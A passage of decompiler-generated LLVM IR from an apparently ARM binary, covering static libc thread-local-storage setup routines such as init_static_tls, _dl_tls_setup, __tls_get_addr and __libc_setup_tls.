  %v2_1890c = add i32 %v2_18908, %v4_188d0
  %v3_1890c = inttoptr i32 %v2_1890c to i16*
  %v4_1890c = load i16, i16* %v3_1890c, align 2
  %v6_1890c = zext i16 %v4_1890c to i32
  %v1_18910 = and i32 %v6_1890c, 8
  %v2_18910 = icmp eq i32 %v1_18910, 0
  br i1 %v2_18910, label %dec_label_pc_18918, label %dec_label_pc_188ec

dec_label_pc_18918:                               ; preds = %dec_label_pc_18904
  %v7_18918 = icmp eq i32 %v0_18948, 4
  br i1 %v7_18918, label %dec_label_pc_18930, label %dec_label_pc_18920

dec_label_pc_18920:                               ; preds = %dec_label_pc_18918
  %v7_18920 = icmp eq i8 %v2_18904, 46
  br i1 %v7_18920, label %dec_label_pc_18928, label %dec_label_pc_18980

dec_label_pc_18928:                               ; preds = %dec_label_pc_18920
  %v1_18928 = add i32 %v0_18934, 1
  store i32 %v1_18928, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18944

dec_label_pc_18930:                               ; preds = %dec_label_pc_18918
  %v2_18930 = icmp eq i8 %v2_18904, 0
  %v1_18934 = add i32 %v0_18934, 1
  store i32 %v1_18934, i32* %r0.global-to-local, align 4
  br i1 %v2_18930, label %dec_label_pc_18944, label %dec_label_pc_1893c

dec_label_pc_1893c:                               ; preds = %dec_label_pc_18930
  %v1_1893c = and i32 %v6_1890c, 32
  %v2_1893c = icmp eq i32 %v1_1893c, 0
  br i1 %v2_1893c, label %dec_label_pc_18980, label %dec_label_pc_18944

dec_label_pc_18944:                               ; preds = %dec_label_pc_1893c, %dec_label_pc_18930, %dec_label_pc_18928
  %v0_188cc14 = phi i32 [ %v1_18934, %dec_label_pc_1893c ], [ %v1_18934, %dec_label_pc_18930 ], [ %v1_18928, %dec_label_pc_18928 ]
  %v4_18944 = mul i32 %v1_18944, 256
  %v5_18944 = or i32 %v0_18944, %v4_18944
  %v1_18948 = add nuw nsw i32 %v0_18948, 1
  %v7_18950 = icmp slt i32 %v1_18948, 5
  br i1 %v7_18950, label %dec_label_pc_188cc, label %dec_label_pc_18954

dec_label_pc_18954:                               ; preds = %dec_label_pc_18944
  %v2_18954 = icmp eq i32 %v0_188ac, 0
  br i1 %v2_18954, label %.thread9.thread, label %bb

.thread9.thread:                                  ; preds = %dec_label_pc_18954
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18984

bb:                                               ; preds = %dec_label_pc_18954
  %v4_18958 = udiv i32 %v5_18944, 16777216
  %v2_1895c = udiv i32 %v5_18944, 256
  %v5_18960 = and i32 %v2_1895c, 65280
  %v2_18964 = and i32 %v5_18944, 65280
  %v5_18968 = mul nuw nsw i32 %v2_18964, 256
  %v5_1896c = mul i32 %v0_18944, 16777216
  %v6_18960 = or i32 %v4_18958, %v5_1896c
  %v6_18968 = or i32 %v6_18960, %v5_18960
  %v6_1896c = or i32 %v6_18968, %v5_18968
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18978 = inttoptr i32 %v0_188ac to i32*
  store i32 %v6_1896c, i32* %v3_18978, align 4
  %v2_18984.pre = load i32, i32* %stack_var_-28, align 4
  %v1_18988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18984

dec_label_pc_18980:                               ; preds = %dec_label_pc_18920, %dec_label_pc_1893c, %dec_label_pc_188cc, %dec_label_pc_188ec, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18984

dec_label_pc_18984:                               ; preds = %.thread9.thread, %bb, %dec_label_pc_18980
  %v1_18988 = phi i32 [ %v1_18988.pre, %bb ], [ 0, %dec_label_pc_18980 ], [ 1, %.thread9.thread ]
  %v2_18984 = phi i32 [ %v2_18984.pre, %bb ], [ %v3_1889c, %dec_label_pc_18980 ], [ %v3_1889c, %.thread9.thread ]
  store i32 %v2_18984, i32* @r4, align 4
  ret i32 %v1_18988

; uselistorder directives
  uselistorder i32 %v1_18948, { 1, 0 }
  uselistorder i32 %v5_18944, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18934, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 6, 4, 1, 2, 3 }
  uselistorder i32 65280, { 64, 0, 5, 1, 2, 6, 7, 8, 9, 10, 36, 44, 45, 46, 11, 12, 13, 47, 48, 14, 15, 16, 17, 37, 49, 3, 50, 51, 18, 19, 38, 52, 53, 39, 20, 21, 22, 23, 24, 54, 55, 56, 57, 40, 41, 42, 4, 58, 59, 25, 60, 26, 27, 28, 29, 43, 61, 30, 31, 32, 62, 33, 34, 35, 63, 65, 66 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 16, 17, 19, 18, 20, 6, 21, 3, 9, 22, 10, 23, 7, 24, 8, 25, 13, 26, 14, 27, 11, 28, 12, 29, 15, 30 }
  uselistorder i16 0, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_18984, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18980, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_18904, { 1, 0 }
  uselistorder label %dec_label_pc_188cc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_189a0 = load i32, i32* @r4, align 4
  store i32 %v3_189a0, i32* %stack_var_-16, align 4
  %v4_189a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_189ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_189b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 36) to i32*), align 4
  store i32 %v4_189b4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_189bc = inttoptr i32 %v4_189a4 to i32*
  %v2_189bc = load i32, i32* %v1_189bc, align 4
  %v4_189c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 52) to i32*), align 4
  store i32 %v4_189c0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_189c8 = add i32 %v2_189bc, 15
  %v4_189cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 144) to i32*), align 4
  store i32 %v4_189cc, i32* @ip, align 4
  %v1_189d0 = load i32, i32* @r0, align 4
  %v2_189d0 = add i32 %v1_189d0, %v1_189c8
  %v1_189d4 = inttoptr i32 %v4_189ac to i32*
  %v2_189d4 = load i32, i32* %v1_189d4, align 4
  store i32 %v2_189d4, i32* %r3.global-to-local, align 4
  %v1_189d8 = and i32 %v2_189d0, -16
  store i32 %v1_189d8, i32* %v1_189bc, align 4
  %v0_189e0 = load i32, i32* @r0, align 4
  %v1_189e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_189e0 = inttoptr i32 %v1_189e0 to i32*
  store i32 %v0_189e0, i32* %v2_189e0, align 4
  %v0_189e4 = load i32, i32* @r1, align 4
  %v1_189e4 = load i32, i32* %lr.global-to-local, align 4
  %v2_189e4 = inttoptr i32 %v1_189e4 to i32*
  store i32 %v0_189e4, i32* %v2_189e4, align 4
  %v0_189e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_189e8 = load i32, i32* @ip, align 4
  %v2_189e8 = inttoptr i32 %v1_189e8 to i32*
  store i32 %v0_189e8, i32* %v2_189e8, align 4
  %v2_189ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_189ec, i32* %r4.global-to-local, align 4
  %v1_189f0 = load i32, i32* @r0, align 4
  ret i32 %v1_189f0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_189f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_189f8:
  %v0_189f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_189f8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_189f8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_189f8, %bb
  %v4_18a08 = phi i32 [ %arg1, %dec_label_pc_189f8 ], [ 0, %bb ]
  ret i32 %v4_18a08

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r3.global-to-local, align 4
  %v4_18a1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 84) to i32*), align 4
  store i32 %v4_18a1c, i32* @lr, align 4
  %v4_18a28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 10752) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 10752), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_18a48 = inttoptr i32 %v4_18a28 to i32*
  store i32 1, i32* %v2_18a48, align 4
  %v0_18a4c = load i32, i32* %r3.global-to-local, align 4
  %v1_18a4c = load i32, i32* @lr, align 4
  %v2_18a4c = inttoptr i32 %v1_18a4c to i32*
  store i32 %v0_18a4c, i32* %v2_18a4c, align 4
  %v0_18a50 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_18a68(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a68:
  %v0_18a68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a68, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18a68
  %v2_18a68 = load i32, i32* @r4, align 4
  %v8_18a68 = ashr i32 %v2_18a68, %arg1
  %v9_18a68 = and i32 %v8_18a68, %arg1
  %v2_18a6c = load i32, i32* @ip, align 4
  %v8_18a6c = lshr i32 %v2_18a6c, %v9_18a68
  %v9_18a6c = and i32 %v8_18a6c, %v9_18a68
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18a68, %bb
  %v7_18a70 = phi i32 [ %arg1, %dec_label_pc_18a68 ], [ %v9_18a6c, %bb ]
  ret i32 %v7_18a70

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_18a7c = call i32 @__aeabi_read_tp()
  %v1_18a80 = inttoptr i32 %v0_18a7c to i32*
  %v2_18a80 = load i32, i32* %v1_18a80, align 4
  %v1_18a84 = add i32 %arg1, 4
  %v2_18a84 = inttoptr i32 %v1_18a84 to i32*
  %v3_18a84 = load i32, i32* %v2_18a84, align 4
  %v1_18a88 = add i32 %v2_18a80, 8
  %v2_18a88 = inttoptr i32 %v1_18a88 to i32*
  %v3_18a88 = load i32, i32* %v2_18a88, align 4
  %v2_18a8c = add i32 %v3_18a88, %v3_18a84
  ret i32 %v2_18a8c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18a98 = load i32, i32* @r4, align 4
  store i32 %v3_18a98, i32* %stack_var_-36, align 4
  %v6_18a98 = load i32, i32* @r5, align 4
  %v15_18a98 = load i32, i32* @r8, align 4
  %v18_18a98 = load i32, i32* @sb, align 4
  %v21_18a98 = load i32, i32* @sl, align 4
  %v24_18a98 = load i32, i32* @fp, align 4
  %v27_18a98 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %sl.global-to-local, align 4
  %v4_18aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 104) to i32*), align 4
  store i32 %v4_18aa8, i32* %r3.global-to-local, align 4
  %v1_18aac = inttoptr i32 %v4_18aa8 to i32*
  %v2_18aac = load i32, i32* %v1_18aac, align 4
  store i32 %v2_18aac, i32* %r2.global-to-local, align 4
  %v2_18ab0 = icmp eq i32 %v2_18aac, 0
  %v0_18ab8 = load i32, i32* %r0.global-to-local, align 4
  %v0_18abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18abc, i32* %ip.global-to-local, align 4
  br i1 %v2_18ab0, label %dec_label_pc_18c84, label %dec_label_pc_18ac4

dec_label_pc_18ac4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_18ac8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 156) to i32*), align 4
  store i32 %v4_18ac8, i32* @lr, align 4
  store i32 %v2_18aac, i32* %r1.global-to-local, align 4
  %v1_18b10 = inttoptr i32 %v4_18ac8 to i32*
  %v2_18b1061 = load i32, i32* %v1_18b10, align 4
  %v4_18b1462 = mul i32 %v2_18b1061, 32
  %v5_18b1463 = add i32 %v4_18b1462, %v2_18aac
  store i32 %v5_18b1463, i32* %r3.global-to-local, align 4
  %v3_18b1865 = icmp ult i32 %v2_18aac, %v5_18b1463
  br i1 %v3_18b1865, label %dec_label_pc_18ad4, label %dec_label_pc_18c84.loopexit

dec_label_pc_18ad4:                               ; preds = %dec_label_pc_18ac4, %dec_label_pc_18b0c
  %v0_18aec66 = phi i32 [ %v1_18b0c, %dec_label_pc_18b0c ], [ %v2_18aac, %dec_label_pc_18ac4 ]
  %v1_18ad4 = inttoptr i32 %v0_18aec66 to i32*
  %v2_18ad4 = load i32, i32* %v1_18ad4, align 4
  store i32 %v2_18ad4, i32* %r3.global-to-local, align 4
  %v7_18ad8 = icmp eq i32 %v2_18ad4, 7
  br i1 %v7_18ad8, label %dec_label_pc_18ae0, label %dec_label_pc_18b0c

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ad4
  %v1_18ae0 = add i32 %v0_18aec66, 20
  %v2_18ae0 = inttoptr i32 %v1_18ae0 to i32*
  %v3_18ae0 = load i32, i32* %v2_18ae0, align 4
  store i32 %v3_18ae0, i32* %r3.global-to-local, align 4
  %v1_18ae4 = add i32 %v0_18aec66, 28
  %v2_18ae4 = inttoptr i32 %v1_18ae4 to i32*
  %v3_18ae4 = load i32, i32* %v2_18ae4, align 4
  store i32 %v3_18ae4, i32* @r6, align 4
  %v1_18aec = add i32 %v0_18aec66, 16
  %v2_18aec = inttoptr i32 %v1_18aec to i32*
  %v3_18aec = load i32, i32* %v2_18aec, align 4
  store i32 %v3_18aec, i32* %r3.global-to-local, align 4
  %v1_18af0 = add i32 %v0_18aec66, 8
  %v2_18af0 = inttoptr i32 %v1_18af0 to i32*
  %v3_18af0 = load i32, i32* %v2_18af0, align 4
  store i32 %v3_18af0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_18ae4, %v0_18abc
  %v0_18abc.v3_18ae4 = select i1 %tmp78, i32 %v0_18abc, i32 %v3_18ae4
  store i32 %v0_18abc.v3_18ae4, i32* %fp.global-to-local, align 4
  %v2_18b28 = icmp eq i32 %v3_18ae4, 0
  br i1 %v2_18b28, label %dec_label_pc_18b50, label %bb

dec_label_pc_18b0c:                               ; preds = %dec_label_pc_18ad4
  %v1_18b0c = add i32 %v0_18aec66, 32
  store i32 %v1_18b0c, i32* %r1.global-to-local, align 4
  %v2_18b10 = load i32, i32* %v1_18b10, align 4
  %v4_18b14 = mul i32 %v2_18b10, 32
  %v5_18b14 = add i32 %v4_18b14, %v2_18aac
  store i32 %v5_18b14, i32* %r3.global-to-local, align 4
  %v3_18b18 = icmp ult i32 %v1_18b0c, %v5_18b14
  br i1 %v3_18b18, label %dec_label_pc_18ad4, label %dec_label_pc_18b10.dec_label_pc_18c84.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_18ae0
  %v2_18b2c = add i32 %v3_18ae4, -1
  br label %dec_label_pc_18b54

dec_label_pc_18b50:                               ; preds = %dec_label_pc_18ae0, %dec_label_pc_18c84
  %v0_18b64.pre = phi i32 [ %v0_18b64.pre.pre, %dec_label_pc_18c84 ], [ ptrtoint (i32* @global_var_233cc.493 to i32), %dec_label_pc_18ae0 ]
  %v1_18b54.pre = phi i32 [ %v1_18b54.pre.pre, %dec_label_pc_18c84 ], [ %v0_18ab8, %dec_label_pc_18ae0 ]
  %v1_18b7825 = phi i32 [ %v0_18c8c, %dec_label_pc_18c84 ], [ %v0_18abc.v3_18ae4, %dec_label_pc_18ae0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_18c84 ], [ %v3_18ae0, %dec_label_pc_18ae0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_18c84 ], [ %v3_18aec, %dec_label_pc_18ae0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_18c84 ], [ %v3_18af0, %dec_label_pc_18ae0 ]
  br label %dec_label_pc_18b54

dec_label_pc_18b54:                               ; preds = %bb, %dec_label_pc_18b50
  %storemerge80 = phi i32 [ %v2_18b2c, %bb ], [ 0, %dec_label_pc_18b50 ]
  %v0_18b54 = phi i32 [ %v2_18b2c, %bb ], [ 0, %dec_label_pc_18b50 ]
  %storemerge = phi i32 [ %v3_18ae4, %bb ], [ 1, %dec_label_pc_18b50 ]
  %storemerge79 = phi i32 [ %v3_18ae4, %bb ], [ 1, %dec_label_pc_18b50 ]
  %v0_18b64 = phi i32 [ ptrtoint (i32* @global_var_233cc.493 to i32), %bb ], [ %v0_18b64.pre, %dec_label_pc_18b50 ]
  %v1_18b54 = phi i32 [ %v0_18ab8, %bb ], [ %v1_18b54.pre, %dec_label_pc_18b50 ]
  %v1_18b78 = phi i32 [ %v0_18abc.v3_18ae4, %bb ], [ %v1_18b7825, %dec_label_pc_18b50 ]
  %stack_var_-52.3 = phi i32 [ %v3_18ae0, %bb ], [ %stack_var_-52.0, %dec_label_pc_18b50 ]
  %stack_var_-48.3 = phi i32 [ %v3_18aec, %bb ], [ %stack_var_-48.0, %dec_label_pc_18b50 ]
  %stack_var_-44.3 = phi i32 [ %v3_18af0, %bb ], [ %stack_var_-44.0, %dec_label_pc_18b50 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_18b54 = add i32 %v1_18b54, %v0_18b54
  %v2_18b58 = udiv i32 %v2_18b54, %storemerge
  store i32 %v2_18b58, i32* %r0.global-to-local, align 4
  %v2_18b5c = mul i32 %v2_18b58, %storemerge
  store i32 %v2_18b5c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_18b64 = add i32 %v0_18b64, 72
  %v3_18b64 = inttoptr i32 %v2_18b64 to i32*
  %v4_18b64 = load i32, i32* %v3_18b64, align 4
  store i32 %v4_18b64, i32* %r3.global-to-local, align 4
  %v1_18b68 = inttoptr i32 %v4_18b64 to i32*
  %v2_18b68 = load i32, i32* %v1_18b68, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_18b70 = add i32 %v1_18b78, 1168
  %v2_18b74 = add i32 %v1_18b70, %stack_var_-52.3
  %v2_18b78 = add i32 %v2_18b74, %v2_18b5c
  %v2_18b7c = add i32 %v2_18b78, %v2_18b68
  store i32 %v2_18b7c, i32* %r0.global-to-local, align 4
  %v1_18b80 = call i32 @__GI_sbrk(i32 %v2_18b7c)
  %v1_18b84 = load i32, i32* %fp.global-to-local, align 4
  %v1_18b8c = sub i32 0, %v1_18b84
  store i32 10240, i32* %r4.global-to-local, align 4
  %v2_18b84 = add i32 %v1_18b80, 1167
  %v1_18b94 = add i32 %v2_18b84, %v1_18b84
  %v2_18b98 = and i32 %v1_18b94, %v1_18b8c
  store i32 %v2_18b98, i32* @r5, align 4
  %v1_18ba0 = load i32, i32* %sl.global-to-local, align 4
  %v3_18ba0 = add i32 %v1_18ba0, 10240
  %v4_18ba0 = inttoptr i32 %v3_18ba0 to i32*
  store i32 62, i32* %v4_18ba0, align 4
  %v0_18ba8 = load i32, i32* @r5, align 4
  %v1_18ba8 = load i32, i32* %sb.global-to-local, align 4
  %v2_18ba8 = add i32 %v1_18ba8, %v0_18ba8
  store i32 %v2_18ba8, i32* @ip, align 4
  %v0_18bac = load i32, i32* %sl.global-to-local, align 4
  %v1_18bac = load i32, i32* %r4.global-to-local, align 4
  %v2_18bac = add i32 %v1_18bac, %v0_18bac
  store i32 %v2_18bac, i32* %r4.global-to-local, align 4
  %v2_18bb0 = add i32 %v0_18bac, 11528
  store i32 %v2_18bb0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_18ba8, i32* @r0, align 4
  %v2_18bc4 = add i32 %v2_18bac, 16
  %v3_18bc4 = inttoptr i32 %v2_18bc4 to i32*
  store i32 %v2_18ba8, i32* %v3_18bc4, align 4
  %v0_18bc8 = load i32, i32* %sb.global-to-local, align 4
  %v1_18bc8 = load i32, i32* %r8.global-to-local, align 4
  %v2_18bc8 = add i32 %v1_18bc8, 40
  %v3_18bc8 = inttoptr i32 %v2_18bc8 to i32*
  store i32 %v0_18bc8, i32* %v3_18bc8, align 4
  %v0_18bcc = load i32, i32* @r3, align 4
  %v1_18bcc = trunc i32 %v0_18bcc to i8
  %v2_18bcc = load i32, i32* %r4.global-to-local, align 4
  %v3_18bcc = add i32 %v2_18bcc, 20
  %v4_18bcc = inttoptr i32 %v3_18bcc to i8*
  store i8 %v1_18bcc, i8* %v4_18bcc, align 1
  %v0_18bd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_18bd0 = add i32 %v0_18bd0, 8
  store i32 %v1_18bd0, i32* @r4, align 4
  %v0_18bd4 = call i32 @memcpy()
  %v0_18bdc = load i32, i32* @r4, align 4
  %v1_18bdc = load i32, i32* @r5, align 4
  %v2_18bdc = inttoptr i32 %v1_18bdc to i32*
  store i32 %v0_18bdc, i32* %v2_18bdc, align 4
  %v0_18be0 = load i32, i32* @r5, align 4
  store i32 %v0_18be0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_18be0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_146e8.689 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_18bf4 = load i32, i32* %sl.global-to-local, align 4
  %v2_18bf4 = add i32 %v0_18bf4, 84
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i32*
  %v4_18bf4 = load i32, i32* %v3_18bf4, align 4
  store i32 %v4_18bf4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10752, i32* %r1.global-to-local, align 4
  %v2_18c00 = add i32 %v0_18bf4, 60
  %v3_18c00 = inttoptr i32 %v2_18c00 to i32*
  %v4_18c00 = load i32, i32* %v3_18c00, align 4
  store i32 %v4_18c00, i32* %r0.global-to-local, align 4
  %v3_18c08 = add i32 %v0_18bf4, 10752
  %v4_18c08 = inttoptr i32 %v3_18c08 to i32*
  store i32 64, i32* %v4_18c08, align 4
  %v1_18c10 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c10 = add i32 %v1_18c10, 20
  %v3_18c10 = inttoptr i32 %v2_18c10 to i32*
  store i32 %stack_var_-44.3, i32* %v3_18c10, align 4
  %v1_18c18 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c18 = add i32 %v1_18c18, 24
  %v3_18c18 = inttoptr i32 %v2_18c18 to i32*
  store i32 %stack_var_-48.3, i32* %v3_18c18, align 4
  %v1_18c20 = load i32, i32* %r0.global-to-local, align 4
  %v2_18c20 = inttoptr i32 %v1_18c20 to i32*
  store i32 1, i32* %v2_18c20, align 4
  %v1_18c28 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c28 = add i32 %v1_18c28, 28
  %v3_18c28 = inttoptr i32 %v2_18c28 to i32*
  store i32 %stack_var_-52.3, i32* %v3_18c28, align 4
  %v0_18c30 = load i32, i32* @r6, align 4
  %v2_18c30 = icmp eq i32 %v0_18c30, 0
  %v1_18c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c34 = add i32 %v1_18c34, 44
  %v3_18c34 = inttoptr i32 %v2_18c34 to i32*
  store i32 1, i32* %v3_18c34, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_18c3c = load i32, i32* %sl.global-to-local, align 4
  %v1_18c3c = load i32, i32* %r1.global-to-local, align 4
  %v2_18c3c = add i32 %v1_18c3c, %v0_18c3c
  store i32 %v2_18c3c, i32* %r2.global-to-local, align 4
  %v1_18c40 = load i32, i32* @r6, align 4
  br i1 %v2_18c30, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_18b54
  store i32 %v1_18c40, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18c4c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c4c35 = add i32 %v1_18c4c34, 32
  %v3_18c4c36 = inttoptr i32 %v2_18c4c35 to i32*
  store i32 %v1_18c40, i32* %v3_18c4c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_18b54
  %v2_18c44 = add i32 %v1_18c40, -1
  store i32 %v2_18c44, i32* %r0.global-to-local, align 4
  %v1_18c4c = load i32, i32* %r8.global-to-local, align 4
  %v2_18c4c = add i32 %v1_18c4c, 32
  %v3_18c4c = inttoptr i32 %v2_18c4c to i32*
  store i32 %v1_18c40, i32* %v3_18c4c, align 4
  %v1_18c50 = load i32, i32* @r6, align 4
  store i32 %v1_18c50, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_18c54 = load i32, i32* %r8.global-to-local, align 4
  %v1_18c54 = load i32, i32* %r2.global-to-local, align 4
  %v2_18c54 = add i32 %v1_18c54, 28
  %v3_18c54 = inttoptr i32 %v2_18c54 to i32*
  store i32 %v0_18c54, i32* %v3_18c54, align 4
  %v0_18c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c58 = load i32, i32* %ip.global-to-local, align 4
  %v2_18c58 = inttoptr i32 %v1_18c58 to i32*
  store i32 %v0_18c58, i32* %v2_18c58, align 4
  %v0_18c5c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c5c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c5c = add i32 %v1_18c5c, %v0_18c5c
  store i32 %v2_18c5c, i32* %r0.global-to-local, align 4
  %v1_18c60 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_18c30, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_18c68.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_18c68 = phi i32 [ %v0_18c68.pre, %._crit_edge ], [ %v1_18c60, %bb54 ]
  %v2_18c64 = udiv i32 %v2_18c5c, %v1_18c60
  %v2_18c68 = load i32, i32* %sb.global-to-local, align 4
  %v3_18c68 = mul i32 %v2_18c64, %v0_18c68
  %v4_18c68 = add i32 %v2_18c68, %v3_18c68
  store i32 %v4_18c68, i32* @r0, align 4
  %v0_18c6c = load i32, i32* %fp.global-to-local, align 4
  %v2_18c6c = icmp ult i32 %v0_18c6c, 16
  %v0_18c6c. = select i1 %v2_18c6c, i32 16, i32 %v0_18c6c
  store i32 %v0_18c6c., i32* @r1, align 4
  %v2_18c7c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_18c7c, i32* @r4, align 4
  store i32 %v6_18a98, i32* @r5, align 4
  store i32 %v15_18a98, i32* %r8.global-to-local, align 4
  store i32 %v18_18a98, i32* %sb.global-to-local, align 4
  store i32 %v21_18a98, i32* %sl.global-to-local, align 4
  store i32 %v24_18a98, i32* %fp.global-to-local, align 4
  store i32 %v27_18a98, i32* @lr, align 4
  %v0_18c80 = call i32 @init_static_tls()
  store i32 %v0_18c80, i32* %r0.global-to-local, align 4
  %v0_18c8c.pre = load i32, i32* @ip, align 4
  %v1_18b54.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_18b64.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18c84

dec_label_pc_18b10.dec_label_pc_18c84.loopexit_crit_edge: ; preds = %dec_label_pc_18b0c
  br label %dec_label_pc_18c84.loopexit

dec_label_pc_18c84.loopexit:                      ; preds = %dec_label_pc_18b10.dec_label_pc_18c84.loopexit_crit_edge, %dec_label_pc_18ac4
